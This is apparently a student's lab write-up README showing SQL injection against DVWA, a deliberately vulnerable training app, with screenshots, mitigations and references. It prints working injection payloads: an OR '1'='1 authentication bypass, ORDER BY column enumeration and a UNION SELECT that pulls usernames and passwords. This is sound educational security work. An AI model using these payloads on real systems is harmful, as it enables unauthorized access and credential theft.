# 🔐 SQL Injection Attack using DVWA

![Security](https://img.shields.io/badge/Cybersecurity-SQL%20Injection-red)
![Platform](https://img.shields.io/badge/Platform-DVWA-green)
![Status](https://img.shields.io/badge/Status-Completed-success)
![Tools](https://img.shields.io/badge/Tools-XAMPP%20%7C%20DVWA%20%7C%20VSCode-blue)

---

## 👨‍💻 Author

**Avijit Baidya**

---

## 📌 Project Overview

This project demonstrates a **SQL Injection vulnerability** using DVWA (Damn Vulnerable Web Application).

It highlights how attackers can exploit weak input validation to:

* Bypass authentication
* Access sensitive data
* Manipulate backend SQL queries

---

## 🎯 Objectives

✔ Understand SQL Injection
✔ Perform authentication bypass
✔ Extract database data
✔ Analyze real-world vulnerabilities
✔ Learn mitigation strategies

---

## 🛠 Tools & Technologies

* DVWA
* XAMPP (Apache + MySQL)
* phpMyAdmin
* Visual Studio Code (VS Code)
* Web Browser
* Git & GitHub

---

## ⚙️ Environment Setup

* Installed XAMPP
* Started Apache & MySQL
* Configured DVWA (`config.inc.php`)
* Created database
* Logged into DVWA

📸 Configuration
![Config](screenshots/config-inc-php.png)

---

## 🔑 DVWA Login

**Credentials:**

* Username: `admin`
* Password: `password`

📸 Login Page
![Login](screenshots/dvwa-login-page.png)

---

## 🧪 SQL Injection Attack

### 🔹 Payload Used

```sql
' OR '1'='1
```

📸 Attack Execution
![SQL Injection](screenshots/SQL-Injection.png)

---

## 💥 Exploitation Result

* Authentication bypass successful
* Multiple user records retrieved
* Vulnerability confirmed

📸 Output
![Result](screenshots/Successfully-Login-1.png)

📸 Additional Output
![Result2](screenshots/Successfully-Login-2.png)

---

## 🔍 Technical Breakdown

### 🧾 Original Query

```sql
SELECT * FROM users WHERE id = 'INPUT';
```

### 💣 Injected Query

```sql
SELECT * FROM users WHERE id = '' OR '1'='1';
```

👉 Always TRUE → returns all records

---

## 🚀 Advanced SQL Injection

### 🔹 Column Enumeration

```sql
1' ORDER BY 1 --
1' ORDER BY 2 --
1' ORDER BY 3 --
```

📸 Column Detection
![Columns](screenshots/attacking-number-of-columns.png)

---

### 🔹 UNION-Based Injection

```sql
1' UNION SELECT user, password FROM users --
```

👉 Extracts usernames and passwords

---

## 🧑‍💻 Database Interaction

📸 User Creation
![User](screenshots/User-ID-Creation.png)

📸 DVWA Files
![DVWA](screenshots/dvwa-file.png)

---

## ⚠️ Vulnerability Severity

| Factor               | Impact        |
| -------------------- | ------------- |
| Authentication       | ❌ Broken      |
| Data Confidentiality | ❌ Compromised |
| Data Integrity       | ⚠️ At Risk    |
| System Security      | 🔥 High Risk  |

---

## 🔁 Attack Flow

```
User Input → Vulnerable Input Field → SQL Query Manipulation → Database Execution → Data Leakage
```

---

## 🛡 Mitigation Techniques

✔ Prepared Statements
✔ Parameterized Queries
✔ Input Validation
✔ Least Privilege Principle
✔ Web Application Firewall (WAF)

---

## 📁 Project Structure

```
Task-3-SQL-Injection/
│
├── screenshots/
│   ├── attacking-number-of-columns.png
│   ├── config-inc-php.png
│   ├── dvwa-file.png
│   ├── dvwa-login-page.png
│   ├── SQL-Injection.png
│   ├── Successfully-Login-1.png
│   ├── Successfully-Login-2.png
│   └── User-ID-Creation.png
│
└── README.md
```

---

## 🎯 Key Learnings

* Real-world SQL Injection exploitation
* Backend query manipulation
* Database security risks
* Hands-on penetration testing experience

---

## 💼 Resume Description

> Performed SQL Injection attacks on DVWA to demonstrate authentication bypass and data extraction vulnerabilities. Implemented various payloads including UNION-based injection and analyzed mitigation strategies.

---

## 🔗 References

* https://owasp.org/www-community/attacks/SQL_Injection
* https://portswigger.net/web-security/sql-injection
* https://en.wikipedia.org/wiki/SQL_injection

---

## ⭐ Conclusion

This project highlights how critical vulnerabilities like SQL Injection can lead to **complete system compromise**, emphasizing the importance of secure coding and input validation.

---
